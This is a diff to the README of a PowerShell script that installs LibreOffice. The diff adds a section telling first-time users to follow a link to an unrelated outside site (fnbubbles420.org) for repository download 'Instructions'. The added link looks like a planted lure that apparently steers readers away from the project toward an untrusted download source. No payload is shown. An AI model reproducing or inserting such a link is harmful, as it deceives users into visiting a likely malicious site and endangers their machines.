@@ -2,6 +2,10 @@
 
 This PowerShell script automates the process of downloading and installing LibreOffice on Windows machines. It ensures that the script is run with administrator privileges, downloads the LibreOffice installer from the official mirror, and installs it to the specified directory.
 
+## how to download the repo first time users
+
+  - click link to read [**Instructions**](https://www.fnbubbles420.org/Instructions-On-How-To-Download-Repo)
+
 ## Prerequisites
 
 - PowerShell 5.1 or higher
